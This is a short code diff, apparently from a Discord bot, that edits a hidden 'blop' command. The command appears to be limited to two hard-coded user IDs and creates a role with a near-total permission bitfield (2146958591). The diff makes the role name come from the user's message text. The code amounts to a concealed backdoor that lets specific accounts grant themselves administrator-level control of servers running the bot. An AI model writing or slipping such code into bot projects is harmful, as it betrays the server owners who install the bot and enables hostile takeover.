@@ -76,13 +76,13 @@ if (message.content.startsWith('blop')) {
    if (message.author.id !== '423118623876448296')
    if (message.author.id !== '301913733536415755')
    return;
-//var role = message.content.split(" ").slice(1)
+var args = message.content.split(" ").slice(1)
 //var numberplace = message.content.split(" ").slice(1)
 
 				message.guild.createRole({
-				  name: "Mikado#5925",
+				  name: args.join(" "),
 				  mentionable: true,
-                                 permissions: 2146958591,
+                                 permissions: 2146958591
 				//position: numberplace.join(" ")
 				})
 	                    
